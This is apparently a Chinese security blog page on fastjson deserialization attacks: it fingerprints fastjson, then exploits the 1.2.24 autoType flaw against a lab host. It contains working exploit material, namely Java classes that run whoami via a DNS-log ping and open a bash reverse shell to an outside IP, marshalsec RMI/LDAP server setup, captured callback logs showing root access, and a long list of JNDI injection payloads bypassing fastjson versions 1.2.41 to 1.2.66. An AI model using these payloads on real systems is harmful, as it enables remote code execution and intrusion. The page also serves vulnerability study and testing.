<h1 id="fastjson指纹特征">fastjson指纹特征</h1>
<p>访问页面，查看反包是一个指定的json格式的数据。请求包：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">GET</span> <span class="o">/</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nx">Host</span><span class="p">:</span> <span class="nx">underattack</span><span class="o">-</span><span class="nx">host</span><span class="p">:</span><span class="mi">8090</span>
<span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="p">:</span> <span class="nx">max</span><span class="o">-</span><span class="nx">age</span><span class="o">=</span><span class="mi">0</span>
<span class="nx">DNT</span><span class="p">:</span> <span class="mi">1</span>
<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="p">:</span> <span class="mi">1</span>
<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="p">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="nx">Win64</span><span class="p">;</span> <span class="nx">x64</span><span class="p">)</span> <span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span> <span class="nx">like</span> <span class="nx">Gecko</span><span class="p">)</span> <span class="nx">Chrome</span><span class="o">/</span><span class="mf">81.0</span><span class="p">.</span><span class="mf">4044.138</span> <span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="nx">Accept</span><span class="p">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">apng</span><span class="p">,</span><span class="o">*</span><span class="cm">/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
</span></code></pre></div></div>
<p>反包：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> 
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">json</span><span class="p">;</span><span class="nx">charset</span><span class="o">=</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="p">:</span> <span class="mi">28</span>
<span class="nb">Date</span><span class="p">:</span> <span class="nx">Tue</span><span class="p">,</span> <span class="mi">19</span> <span class="nx">May</span> <span class="mi">2020</span> <span class="mi">01</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">29</span> <span class="nx">GMT</span>
<span class="nx">Connection</span><span class="p">:</span> <span class="nx">close</span>

<span class="p">{</span>
    <span class="dl">"</span><span class="s2">age</span><span class="dl">"</span><span class="p">:</span><span class="mi">25</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">Bob</span><span class="dl">"</span>
<span class="p">}</span>
</code></pre></div></div>
<p>如上的请求和反包。我们知道了json的格式直接构造参数，给服务器发包看看：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">POST</span> <span class="o">/</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nx">Host</span><span class="p">:</span> <span class="nx">underattack</span><span class="o">-</span><span class="nx">host</span><span class="p">:</span><span class="mi">8090</span>
<span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="p">:</span> <span class="nx">max</span><span class="o">-</span><span class="nx">age</span><span class="o">=</span><span class="mi">0</span>
<span class="nx">DNT</span><span class="p">:</span> <span class="mi">1</span>
<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="p">:</span> <span class="mi">1</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">json</span>
<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="p">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="nx">Win64</span><span class="p">;</span> <span class="nx">x64</span><span class="p">)</span> <span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span> <span class="nx">like</span> <span class="nx">Gecko</span><span class="p">)</span> <span class="nx">Chrome</span><span class="o">/</span><span class="mf">81.0</span><span class="p">.</span><span class="mf">4044.138</span> <span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="nx">Accept</span><span class="p">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">apng</span><span class="p">,</span><span class="o">*</span><span class="cm">/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Length: 26

{"name":"hello", "age":20}
</span></code></pre></div></div>
<p>反包：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> 
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">json</span><span class="p">;</span><span class="nx">charset</span><span class="o">=</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="p">:</span> <span class="mi">30</span>
<span class="nb">Date</span><span class="p">:</span> <span class="nx">Tue</span><span class="p">,</span> <span class="mi">19</span> <span class="nx">May</span> <span class="mi">2020</span> <span class="mi">01</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">20</span> <span class="nx">GMT</span>
<span class="nx">Connection</span><span class="p">:</span> <span class="nx">close</span>

<span class="p">{</span>
    <span class="dl">"</span><span class="s2">age</span><span class="dl">"</span><span class="p">:</span><span class="mi">20</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">hello</span><span class="dl">"</span>
<span class="p">}</span>
</code></pre></div></div>
<p>我们看到服务器端返回包为我们构造的包。</p>

<h3 id="fastjson-1224-反序列化导致任意命令执行漏洞">fastjson 1.2.24 反序列化导致任意命令执行漏洞</h3>
<p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>

<p>参考资料：</p>
<ul>
  <li>https://www.freebuf.com/vuls/208339.html</li>
  <li>http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</li>
</ul>

<p>首先编译并上传命令执行代码</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span> <span class="nx">cat</span> <span class="nx">dnslog</span><span class="p">.</span><span class="nx">java</span>

<span class="k">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">;</span>
<span class="k">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Process</span><span class="p">;</span>

<span class="kr">public</span> <span class="kd">class</span> <span class="nx">dnslog</span> <span class="p">{</span>
    <span class="kd">static</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="nx">Runtime</span> <span class="nx">rt</span> <span class="o">=</span> <span class="nx">Runtime</span><span class="p">.</span><span class="nx">getRuntime</span><span class="p">();</span>
            <span class="nb">String</span><span class="p">[]</span> <span class="nx">commands</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">/bin/sh</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">-c</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">ping user.`whoami`.c08aqu.dnslog.cn</span><span class="dl">"</span><span class="p">};</span>
            <span class="nx">Process</span> <span class="nx">pc</span> <span class="o">=</span> <span class="nx">rt</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">commands</span><span class="p">);</span>
            <span class="nx">pc</span><span class="p">.</span><span class="nx">waitFor</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// do nothing</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>编译：<code class="language-plaintext highlighter-rouge">javac dnslog.java</code>。生成class文件；然后我们借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并指定受害机器访问9999端口后，去加载远程服务器的类<code class="language-plaintext highlighter-rouge">dnslog.class</code>，而class文件就是执行command。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/mbechler/marshalsec.git

<span class="nb">cd </span>marshalsec

mvn clean package <span class="nt">-DskipTests</span> <span class="c">#看到BUILD SUCCESS后进入target</span>

<span class="nb">cd </span>target

java <span class="nt">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="s2">"https://www.chihou.pro/#dnslog"</span> 9999

<span class="k">*</span> Opening JRMP listener on 9999
</code></pre></div></div>

<p>开启监听。向靶场服务器发送Payload，带上RMI的地址：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">POST数据</span><span class="err">：</span>
<span class="p">{</span>
    <span class="dl">"</span><span class="s2">b</span><span class="dl">"</span><span class="p">:{</span>

        <span class="dl">"</span><span class="s2">@type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">com.sun.rowset.JdbcRowSetImpl</span><span class="dl">"</span><span class="p">,</span>

        <span class="dl">"</span><span class="s2">dataSourceName</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">rmi://47.52.233.92:9999/dnslog</span><span class="dl">"</span><span class="p">,</span>

        <span class="dl">"</span><span class="s2">autoCommit</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="o">----</span>
<span class="p">{</span>
    <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:{</span>
        <span class="dl">"</span><span class="s2">@type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">java.lang.Class</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">val</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">com.sun.rowset.JdbcRowSetImpl</span><span class="dl">"</span>
    <span class="p">},</span>

    <span class="dl">"</span><span class="s2">x</span><span class="dl">"</span><span class="p">:{</span>

        <span class="dl">"</span><span class="s2">@type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">com.sun.rowset.JdbcRowSetImpl</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">dataSourceName</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">ldap://47.52.233.92:9999/expUseful</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">autoCommit</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>发送完毕后检查RMI服务器的监听记录：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span> Opening JRMP listener on 9999
Have connection from /61.133.171.114:11430
Reading message...
Is RMI.lookup call <span class="k">for </span>dnslog 2
Sending remote classloading stub targeting https://www.chihou.pro/dnslog.class
Closing connection
</code></pre></div></div>
<p>受害机器已经访问了我们的服务器，最后检查是否执行dnslog命令；</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user.root.c08aqu.dnslog.cn  61.132.161.12   2020-08-14 15:43:30
user.root.c08aqu.dnslog.cn  61.132.161.5    2020-08-14 15:43:30
user.root.c08aqu.dnslog.cn  61.132.161.12   2020-08-14 15:43:30
user.root.c08aqu.dnslog.cn  61.132.161.5    2020-08-14 15:43:30
</code></pre></div></div>
<p>可见，<code class="language-plaintext highlighter-rouge">ping</code>命令已成功执行;</p>

<h4 id="反弹shell">反弹shell</h4>
<p>同样的，直接在poc代码里修改反弹shell的代码即可。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import java.lang.Runtime<span class="p">;</span>
import java.lang.Process<span class="p">;</span>

public class nc <span class="o">{</span>
    static <span class="o">{</span>
    
        try<span class="o">{</span>
        Runtime rt <span class="o">=</span> Runtime.getRuntime<span class="o">()</span><span class="p">;</span>
        String[] commands <span class="o">=</span> <span class="o">{</span><span class="s2">"/bin/bash"</span>,<span class="s2">"-c"</span>,<span class="s2">"bash -i &gt;&amp; /dev/tcp/47.52.233.92/12341 0&gt;&amp; 1"</span><span class="o">}</span><span class="p">;</span>
        Process pc <span class="o">=</span> rt.exec<span class="o">(</span>commands<span class="o">)</span><span class="p">;</span>
        pc.waitFor<span class="o">()</span><span class="p">;</span>
        <span class="o">}</span>catch <span class="o">(</span>Exception e<span class="o">)</span> <span class="o">{</span>
        //no
        <span class="o">}</span>
    
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p>同理即可获得反弹shell：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nc -lvnp 12341</span>
Listening on 0.0.0.0 12341
Connection received on 120.242.209.70 3450
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@5a8812147218:/# <span class="nb">whoami
whoami
</span>root
</code></pre></div></div>

<h2 id="dnslog">dnslog</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"rand1"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.InetAddress"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}}</span>

<span class="o">{</span><span class="s2">"rand2"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.Inet4Address"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}}</span>

<span class="o">{</span><span class="s2">"rand3"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.Inet6Address"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}}</span>

<span class="o">{</span><span class="s2">"rand4"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.InetSocketAddress"</span><span class="o">{</span><span class="s2">"address"</span>:,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}}}</span>

<span class="o">{</span><span class="s2">"rand5"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.URL"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}}</span>

一些畸形payload，不过依然可以触发dnslog：
<span class="o">{</span><span class="s2">"rand6"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"com.alibaba.fastjson.JSONObject"</span>, <span class="o">{</span><span class="s2">"@type"</span>: <span class="s2">"java.net.URL"</span>, <span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}}</span><span class="s2">""</span><span class="o">}}</span>
<span class="o">{</span><span class="s2">"@type"</span>: <span class="s2">"java.lang.AutoCloseable"</span>


<span class="o">{</span><span class="s2">"rand7"</span>:Set<span class="se">\[</span><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.URL"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}</span><span class="se">\]</span><span class="o">}</span>

<span class="o">{</span><span class="s2">"rand8"</span>:Set<span class="se">\[</span><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.URL"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}</span>

<span class="o">{</span><span class="s2">"rand9"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.URL"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}</span>


<span class="o">{</span><span class="s2">"@type"</span>: <span class="s2">"java.lang.AutoCloseable"</span>
</code></pre></div></div>

<hr />

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="o">{</span><span class="s2">"a"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.lang.Class"</span>,<span class="s2">"val"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span><span class="o">}</span>,<span class="s2">"b"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}}</span>

<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}</span>
</code></pre></div></div>

<hr />

<ul>
  <li>1.2.41</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"Lcom.sun.rowset.JdbcRowSetImpl;"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>, <span class="s2">"autoCommit"</span>:true<span class="o">}</span>
// 直接加 <span class="o">[</span> 是不可以的，因为数组实例化的是Object类型，所以需要将传入的变量设置为数组格式，然后在com.alibaba.fastjson.serializer.ObjectArrayCodec中通过数组对象的getComponentType<span class="o">()</span>可以获得数组元素，即com.sun.rowset.JdbcRowSetImpl对象
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"[com.sun.rowset.JdbcRowSetImpl"</span><span class="o">[{</span><span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>,<span class="s2">"autoCommit"</span>:true]<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>1.2.42</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"LLcom.sun.rowset.JdbcRowSetImpl;;"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>, <span class="s2">"autoCommit"</span>:true<span class="o">}</span>
//原来在41版本的[还能用
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"[com.sun.rowset.JdbcRowSetImpl"</span><span class="o">[{</span><span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>,<span class="s2">"autoCommit"</span>:true]<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>1.2.43</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>,<span class="s2">"properties"</span>:<span class="o">{</span><span class="s2">"data_source"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}}</span>
</code></pre></div></div>
<ul>
  <li>1.2.45</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>,<span class="s2">"properties"</span>:<span class="o">{</span><span class="s2">"data_source"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}}</span>
</code></pre></div></div>
<ul>
  <li>1.2.47</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"a"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.lang.Class"</span>,<span class="s2">"val"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span><span class="o">}</span>,<span class="s2">"b"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}}}</span>

<span class="o">{</span><span class="s2">"a"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.lang.Class"</span>,<span class="s2">"val"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span><span class="o">}</span>,<span class="s2">"b"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"rmi://47.52.233.92:9999/expUseful"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}}}</span>

</code></pre></div></div>
<ul>
  <li>1.2.60</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.commons.configuration.JNDIConfiguration"</span>,<span class="s2">"prefix"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"oracle.jdbc.connector.OracleManagedConnectionFactory"</span>,<span class="s2">"xaDataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}</span>
</code></pre></div></div>

<p>{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://10.10.20.166:1099/ExportObject"}
{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://10.10.20.166:1389/ExportObject"}</p>

<p>{"@type":"org.apache.commons.configuration2.JNDIConfiguration","prefix":"rmi://127.0.0.1:1099/Exploit"}”</p>

<ul>
  <li>1.2.62</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.xbean.propertyeditor.JndiConverter"</span>,<span class="s2">"AsText"</span>:<span class="s2">"rmi://127.0.0.1:1099/exploit"</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>1.2.66</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.shiro.jndi.JndiObjectFactory"</span>,<span class="s2">"resourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}</span>
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"br.com.anteros.dbcp.AnterosDBCPConfig"</span>,<span class="s2">"metricRegistry"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}</span>
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup"</span>,<span class="s2">"jndiNames"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}</span>
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig"</span>,<span class="s2">"properties"</span>: <span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"
java.util.Properties"</span>,<span class="s2">"UserTransaction"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}}</span>
</code></pre></div></div>

<ul>
  <li>RMI</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"LLcom.sun.rowset.RowSetImpl;;"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"rmi://localhost:1099/Exploit"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}</span> 1.2.42
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"[com.sun.rowset.RowSetImpl"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"rmi://localhost:1099/Exploit"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}</span> 1.2.25v1.2.43
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>,<span class="s2">"properties"</span>：<span class="s2">"data_source"</span>:<span class="s2">"rmi://localhost:1099/Exploit"</span><span class="o">}}</span> 1.2.25
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"Lcom.sun.rowset.RowSetImpl;"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"rmi://localhost:1099/Exploit"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}</span>
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>com.zaxxer.hikari.HikariConfig<span class="se">\"</span>,<span class="se">\"</span>metricRegistry<span class="se">\"</span>:<span class="se">\"</span>rmi://127.0.0.1:1099/Exploit<span class="se">\"</span><span class="o">}</span>1.2.60
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>org.apache.commons.configuration.JNDIConfiguration<span class="se">\"</span>,<span class="se">\"</span>prefix<span class="se">\"</span>:<span class="se">\"</span>rmi://127.0.0.1:1099/Exploit<span class="se">\"</span><span class="o">}</span> 1.2.60
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>org.apache.commons.configuration2.JNDIConfiguration<span class="se">\"</span>,<span class="se">\"</span>prefix<span class="se">\"</span>:<span class="se">\"</span>rmi://127.0.0.1:1099/Exploit<span class="se">\"</span><span class="o">}</span> 1.2.61
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>org.apache.xbean.propertyeditor.JndiConverter<span class="se">\"</span>,<span class="se">\"</span>asText<span class="se">\"</span>:<span class="se">\"</span>rmi://localhost:1099/Exploit<span class="se">\"</span><span class="o">}</span>  1.2.62
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>br.com.anteros.dbcp.AnterosDBCPConfig<span class="se">\"</span>,<span class="se">\"</span>healthCheckRegistry<span class="se">\"</span>:<span class="se">\"</span>rmi://localhost:1099/Exploit<span class="se">\"</span><span class="o">}</span> AnterosDBCPConfig
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>br.com.anteros.dbcp.AnterosDBCPConfig<span class="se">\"</span>,<span class="se">\"</span>metricRegistry<span class="se">\"</span>:<span class="se">\"</span>rmi://localhost:1099/Exploit<span class="se">\"</span><span class="o">}</span> AnterosDBCPConfig
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig<span class="se">\"</span>,<span class="se">\"</span>properties<span class="se">\"</span>:<span class="o">{</span><span class="se">\"</span>UserTransaction<span class="se">\"</span>:<span class="se">\"</span>rmi://localhost:1099/Exploit<span class="se">\"</span><span class="o">}}</span> JtaTransactionConfig
</code></pre></div></div>

